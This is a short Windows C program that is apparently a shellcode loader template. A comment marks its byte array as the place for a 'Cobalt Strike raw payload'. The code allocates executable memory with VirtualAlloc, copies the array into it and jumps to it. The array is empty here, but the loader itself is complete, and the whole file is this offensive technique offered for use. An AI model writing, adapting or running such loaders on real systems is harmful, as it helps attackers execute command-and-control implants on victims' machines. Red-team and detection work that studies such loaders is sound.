#include <Windows.h>

int main() {
	
	// Input C - Cobalt Strike raw payload for 
	unsigned char payload[] = "";

	void *exec = VirtualAlloc(0, sizeof(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	memcpy(exec, payload, sizeof(payload));
	((void(*)())exec)();
	return 0;
}